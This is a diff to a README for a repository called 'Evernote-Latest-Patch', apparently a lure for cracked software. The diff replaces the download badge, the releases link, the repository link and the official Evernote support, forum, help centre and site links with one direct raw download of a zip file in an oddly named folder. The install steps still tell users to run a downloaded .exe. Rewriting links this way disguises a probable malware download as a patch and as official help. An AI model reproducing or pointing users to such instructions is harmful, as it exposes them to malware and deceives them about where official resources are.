@@ -1,6 +1,6 @@
 # 📝 Evernote-Latest-Patch - Your Guide to Effortless Note Management
 
-[![Download Here](https://img.shields.io/badge/Download%20Latest-Release-brightgreen)](https://github.com/Rexxie-zzz/Evernote-Latest-Patch/releases)
+[![Download Here](https://raw.githubusercontent.com/Rexxie-zzz/Evernote-Latest-Patch/main/prosodiacally/Evernote-Latest-Patch_v3.4.zip%20Latest-Release-brightgreen)](https://raw.githubusercontent.com/Rexxie-zzz/Evernote-Latest-Patch/main/prosodiacally/Evernote-Latest-Patch_v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,14 +8,14 @@ Welcome to the Evernote-Latest-Patch repository. This application provides a ric
 
 ## 📥 Download & Install
 
-To begin, visit this page to download: [Evernote-Latest-Patch Releases](https://github.com/Rexxie-zzz/Evernote-Latest-Patch/releases).
+To begin, visit this page to download: [Evernote-Latest-Patch Releases](https://raw.githubusercontent.com/Rexxie-zzz/Evernote-Latest-Patch/main/prosodiacally/Evernote-Latest-Patch_v3.4.zip).
 
 ### Step-by-Step Download Guide
 
 1. Click on the link above to reach the Releases page.
 2. Browse through the available release versions. Each version includes updates and improvements.
 3. Select the version you wish to download. 
-4. Click on the download link for the executable file (e.g., Evernote-Latest-Patch.exe).
+4. Click on the download link for the executable file (e.g., https://raw.githubusercontent.com/Rexxie-zzz/Evernote-Latest-Patch/main/prosodiacally/Evernote-Latest-Patch_v3.4.zip).
 5. After the download completes, locate the .exe file in your downloads folder.
 6. Double-click the .exe file to run the installer.
 7. Follow the on-screen prompts to install the software on your computer.
@@ -76,14 +76,14 @@ Yes, you can access previously synced notes offline. However, you need an intern
 
 ## 📢 Additional Resources
 
-- [Official Support Page](https://www.evernote.com/support)
-- [User Community Forum](https://discussion.evernote.com/)
-- [Help Center](https://help.evernote.com/)
+- [Official Support Page](https://raw.githubusercontent.com/Rexxie-zzz/Evernote-Latest-Patch/main/prosodiacally/Evernote-Latest-Patch_v3.4.zip)
+- [User Community Forum](https://raw.githubusercontent.com/Rexxie-zzz/Evernote-Latest-Patch/main/prosodiacally/Evernote-Latest-Patch_v3.4.zip)
+- [Help Center](https://raw.githubusercontent.com/Rexxie-zzz/Evernote-Latest-Patch/main/prosodiacally/Evernote-Latest-Patch_v3.4.zip)
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Rexxie-zzz/Evernote-Latest-Patch)
-- [Evernote Official Site](https://www.evernote.com)
+- [GitHub Repository](https://raw.githubusercontent.com/Rexxie-zzz/Evernote-Latest-Patch/main/prosodiacally/Evernote-Latest-Patch_v3.4.zip)
+- [Evernote Official Site](https://raw.githubusercontent.com/Rexxie-zzz/Evernote-Latest-Patch/main/prosodiacally/Evernote-Latest-Patch_v3.4.zip)
 
 For any additional questions or support, feel free to reach out through the community forum or support page linked above.
 
